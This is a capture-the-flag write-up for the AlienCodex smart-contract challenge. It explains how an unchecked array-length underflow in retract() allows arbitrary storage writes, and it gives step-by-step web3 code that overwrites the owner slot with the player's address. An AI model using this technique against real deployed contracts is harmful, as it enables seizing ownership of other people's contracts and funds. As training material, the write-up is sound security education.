# Introduction 

The *AlienCodex* contract is a challenge in Capture The Flag (CTF), requiring players to take ownership of the contract. This contract contains a critical vulnerability related to dynamic array handling and integer arithmetic, allowing an attacker to overwrite any storage slot in the contract, including the `owner` variable.

## Target
Change the address stored in the `owner` variable to the attacker's address (player).

## Context

The *AlienCodex* contract has the following key components:

- An `owner` variable (type `address`) that stores the owner's address.
- A `contact` variable (type `bool`) to mark the contact status.
- Most importantly, a dynamic array `codex` (type `bytes32[]`).

The `record`, `retract`, and `revise` functions all have a `contacted` modifier, requiring the `contact` variable to be `true` before they can be called.

---

## Vulnerability

The main vulnerability lies in the `retract()` function. This function decreases the length of the `codex` array by 1. However, it does not check if the length is already 0 before performing the subtraction.

### Solidity Code (Assumed)

```solidity
function retract() contacted public {
    codex.length--; // VULNERABILITY: No underflow check if length is 0
}
```

### Exploitation Steps:

1. **Set the `contact` state:**
   Call the `makeContact()` function to set the `contact` variable to `true`. This is necessary to bypass the `contacted` modifier in subsequent functions.

   ```javascript
   // Call makeContact()
   await contract.makeContact();
   // Check contact state (optional)
   await contract.contact(); // true
   ```

2. **Trigger the Underflow Vulnerability:**
   Call the `retract()` function. Since `codex.length` is initially 0, this operation will cause an underflow, setting `codex.length` to `2**256 - 1`.

   ```javascript
   // Call retract() to trigger underflow
   await contract.retract();
   ```

   Now, the contract believes the `codex` array can access nearly the entire 256-bit storage space.

3. **Locate the `owner` storage slot and calculate the index `i`:**

   In the Ethereum Virtual Machine (EVM), state variables are stored sequentially in 32-byte "slots." Smaller variables are packed into the same slot if possible.

   - The `owner` (address, 20 bytes) and `contact` (bool, 1 byte) variables are packed together in slot 0.
   - The length of the dynamic array `codex` is stored in slot 1.
   - The actual data of the `codex` array starts at a storage location calculated as `keccak256(slot_of_length)`. Let this starting position be `p`.

   ```javascript
   // Calculate the starting position of the codex array (p)
   p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]));
   ```

   To overwrite slot 0, we need to find an index `i` such that `p + i ≡ 0 (mod 2**256)`.

   ```javascript
   // Calculate the index i corresponding to slot 0
   i = BigInt(2 ** 256) - BigInt(p);
   ```

4. **Prepare the Overwrite Data (`content`):**

   Slot 0 contains `contact` (1 byte) and `owner` (20 bytes), with `owner` occupying the lower 20 bytes. To overwrite the `owner`, we need a `bytes32` value where the last 20 bytes are the attacker's address.

   ```javascript
   // Assume the attacker's address is defined as:
   // player = '0xcAC6377d429bAfA67f22fFd80447Af93E420f7Ec';

   // Create the payload: pad the player's address to 32 bytes
   content = '0x' + '0'.repeat(24) + player.slice(2);
   ```

5. **Perform the Overwrite:**
   Call the `revise(i, content)` function to write the `content` value to `codex[i]`. Since `i` points to slot 0, this will overwrite the `owner` variable.

   ```javascript
   // Call revise to write content to codex[i] (slot 0)
   await contract.revise(i, content);
   ```

6. **Verify Ownership:**
   Check the value of the `owner` variable. It should now be the attacker's address.

   ```javascript
   // Verify the new owner
   await contract.owner(); // '0xcAC6377d429bAfA67f22fFd80447Af93E420f7Ec'
   (await contract.owner()) === player; // true
   ```
## Conclusion

By exploiting the underflow vulnerability in the `retract()` function and leveraging the EVM's storage layout, we successfully overwrote the `owner` variable with the attacker's address. This demonstrates the importance of proper input validation and boundary checks in smart contract development to prevent such critical vulnerabilities.